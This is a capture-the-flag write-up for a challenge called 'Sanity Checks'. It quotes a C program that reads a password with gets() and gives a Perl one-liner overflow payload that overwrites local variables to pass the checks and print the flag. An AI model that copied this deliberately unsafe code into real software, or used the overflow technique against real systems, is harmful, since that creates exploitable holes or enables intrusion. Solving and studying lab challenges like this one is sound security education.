
# Sanity Checks

## Description

```
I made a program (source) to protect my flag. On the off chance someone does get in, I added some sanity checks to detect if something fishy is going on. See if you can hack me at /problems/2021/sanity_checks on the shell server, or connect with nc shell.actf.co 21303.

Author: kmh
```

## Analysis

We just have to overflow the `password` buffer to set the following variables to the right values.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    char password[64];
    int ways_to_leave_your_lover = 0;
    int what_i_cant_drive = 0;
    int when_im_walking_out_on_center_circle = 0;
    int which_highway_to_take_my_telephones_to = 0;
    int when_i_learned_the_truth = 0;

    printf("Enter the secret word: ");

    gets(&password);

    if(strcmp(password, "password123") == 0){
        puts("Logged in! Let's just do some quick checks to make sure everything's in order...");
        if (ways_to_leave_your_lover == 50) {
            if (what_i_cant_drive == 55) {
                if (when_im_walking_out_on_center_circle == 245) {
                    if (which_highway_to_take_my_telephones_to == 61) {
                        if (when_i_learned_the_truth == 17) {
                            char flag[128];

                            FILE *f = fopen("flag.txt","r");

                            if (!f) {
                                printf("Missing flag.txt. Contact an admin if you see this on remote.");
                                exit(1);
                            }

                            fgets(flag, 128, f);

                            printf(flag);
                            return;
                        }
                    }
                }
            }
        }
        puts("Nope, something seems off.");
    } else {
        puts("Login failed!");
    }
}
```

## Solution

After a bit of trial-and-error, and lining things up in gdb, this is the final payload:

```
team8838@actf:/problems/2021/sanity_checks$ perl -e 'print "password123\x00" . "A"x64 . "\x11\x00\x00\x00" . "\x3D\x00\x00\x00" . "\xF5\x00\x00\x00" . "\x37\x00\x00\x00" . "\x32\x00\x00\x00"' | ./checks 
Enter the secret word: Logged in! Let's just do some quick checks to make sure everything's in order...
actf{if_you_aint_bout_flags_then_i_dont_mess_with_yall}
```

